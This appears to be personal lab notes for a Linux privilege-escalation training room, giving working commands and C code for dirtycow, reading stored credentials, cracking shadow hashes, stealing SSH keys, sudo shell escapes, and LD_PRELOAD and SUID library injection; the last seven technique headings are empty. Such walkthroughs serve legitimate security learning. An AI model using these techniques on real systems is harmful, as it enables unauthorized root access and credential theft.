# Linux Privilege Escalation Arena

In this room we are going to attempt to escalate from a low level user to root account using different techniques.

### Technique 1: Kernel Exploits

Run linux exploit suggester and see that the system is vulnerable to dirtycow.

Compile the file that exploits this vulnerability, run it, and become root:

```
gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
./c0w
passwd
```



### Technique 2:  Stored Passwords (Config Files)

```
cat /home/user/myvpn.ovpn
cat /etc/openvpn/auth.txt
cat /home/user/.irssi/config | grep -i passw
```

Exposes the credentials of `user:password321`.

### Technique 3:  Stored Passwords (History)

```
history
```

Check previous commands and grab the root password.

![image-20230729084945788](./images/image-20230729084945788.png)

### Technique 4:  Weak File Permissions

Check for read/writable shadow file:

```
ls -la /etc/shadow
```

> -rw-rw-r-- 1 root shadow 809 Jun 17  2020 /etc/shadow

We have read access. Read the password of the root user and crack it.

```
unshadow passwd.txt shadow.txt > unshadowed.txt
hashcat -m 1800 unshadowed.txt rockyou.txt
```



### Technique 5: SSH Keys

Find 

```
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```

id_rsa is typically a file that contains the private key of an SSH key pair. The key pair consists of a private key and a corresponding public key.

> /backups/supersecretkeys/id_rsa

Copy file to attacker machine, change permissions and login as root.

```
chmod 400 id_rsa
ssh -i id_rsa root@<ip>
```



### Technique 6: Sudo (Shell Escaping)

```
sudo -l
```

Check GTFObins for further ways to escalate:

```
sudo find /bin -name nano -exec /bin/sh \;
sudo awk 'BEGIN {system("/bin/sh")}'
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
sudo vim -c '!sh'
```



### Technique 7: Sudo (Abusing Intended Functionality)

```
sudo -l
```

Using apache2 we can read files with root privileges in the machine. Read /etc/shadow and crack the hash.

```
sudo apache2 -f /etc/shadow
john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
```



### Technique 8: Sudo (LD_PRELOAD)

```
sudo -l
```

Notice that the LD_PRELOAD environment variable is intact. Save the code below to a .c file.

> #include <stdio.h>
> #include <sys/types.h>
> #include <stdlib.h>
>
> void _init() {
>     unsetenv("LD_PRELOAD");
>     setgid(0);
>     setuid(0);
>     system("/bin/bash");
> }

```
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so apache2
```

You are root!



### Technique 9: SUID (Shared Object Injection)

Find executables which are SUID executable. 

```
find / -type f -perm -04000 -ls 2>/dev/null
```


Run strace on the file and search the output for open/access calls and for "no such file" errors:

```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

See where the missing file should be placed and if you have write access to that folder. Create a path to that compiled file.
```
mkdir /home/user/.config
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```

The code should be something like this (-p preserves permissions)
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	system("/bin/bash -p");
}
```

or

```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Finally, run the binary and get root.

### Technique 10: SUID (Symlinks)





### Technique 11: SUID (Environmental Variables)





### Technique 12: Capabilities





### Technique 13: Cron (PATH)

### Technique 14: Cron (Wildcards)

### Technique 15: Cron (File Overwrite)

### Technique 16: NFS Root Squashing
